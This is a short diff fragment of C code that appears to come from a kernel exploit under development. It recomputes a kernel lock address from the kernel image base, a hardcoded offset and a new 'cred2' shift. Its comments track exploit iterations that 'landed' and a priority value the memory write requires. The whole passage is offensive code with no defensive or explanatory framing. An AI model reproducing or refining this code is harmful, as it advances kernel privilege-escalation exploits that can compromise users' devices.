@@ -1060,7 +1060,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               stack_lock = data_addr(KIMAGE_TEXT_BASE +
                   (active_offsets && active_offsets->off_bss_tail_lock
                        ? (uint64_t)active_offsets->off_bss_tail_lock
-                       : 0x02BB9D00ULL));
+                       : 0x02BB9D00ULL) +
+                  (uint64_t)g_cred2_lock_shift);
               /* prio MUST be 0 (Z33 stamp): the 08-24 writer hardcoded
                * word8=0, so Z25-Z33 all walked prio=0 and Z33 landed.
                * 93473c5 (08-29) started emitting stack_prio(3) — the
